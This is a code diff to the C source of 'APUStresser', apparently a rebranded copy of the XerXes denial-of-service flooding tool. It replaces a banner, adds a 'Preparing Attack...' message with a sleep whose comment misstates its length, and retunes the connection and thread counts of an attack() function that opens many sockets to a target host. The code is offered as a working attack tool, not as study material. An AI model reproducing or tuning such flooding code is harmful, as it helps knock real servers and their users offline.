@@ -1,28 +1,4 @@
-/*
-MMP"""""""MM dP oo
-M' .mmmm  MM 88
-M         `M 88 dP .d8888b. 88d888b.
-M  MMMMM  MM 88 88 88ooood8 88'  `88
-M  MMMMM  MM 88 88 88.  ... 88    88
-M  MMMMM  MM dP dP `88888P' dP    dP
-MMMMMMMMMMMM
-
-MM"""""""`YM                                  dP
-MM  mmmmm  M                                  88
-M'        .M .d8888b. 88d888b. .d8888b. .d888b88 .d8888b. dP.  .dP
-MM  MMMMMMMM 88'  `88 88'  `88 88'  `88 88'  `88 88'  `88  `8bd8'
-MM  MMMMMMMM 88.  .88 88       88.  .88 88.  .88 88.  .88  .d88b.
-MM  MMMMMMMM `88888P8 dP       `88888P8 `88888P8 `88888P' dP'  `dP
-MMMMMMMMMMMM
-
-M""MMMMM""M          oo   dP
-M  MMMMM  M               88
-M  MMMMM  M 88d888b. dP d8888P
-M  MMMMM  M 88'  `88 88   88
-M  `MMM'  M 88    88 88   88
-Mb       dM dP    dP dP   dP
-MMMMMMMMMMM                   
-*/
+/* APUStresser - XerXes (http://www.alienparadoxunit.com)  (http://www.thehackernews.com)  */
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -35,16 +11,13 @@ MMMMMMMMMMM
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-#include <time.h>
 
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
-
-		{
-			printf("Alien Paradox Stresser﻿\n");
-		}
-
+void print_image(FILE *fptr);
+printf("Preparing Attack...");
+sleep(5); // sleep for 3 seconds
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
@@ -79,8 +52,8 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 20
-#define THREADS 120
+#define CONNECTIONS 15
+#define THREADS 150
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
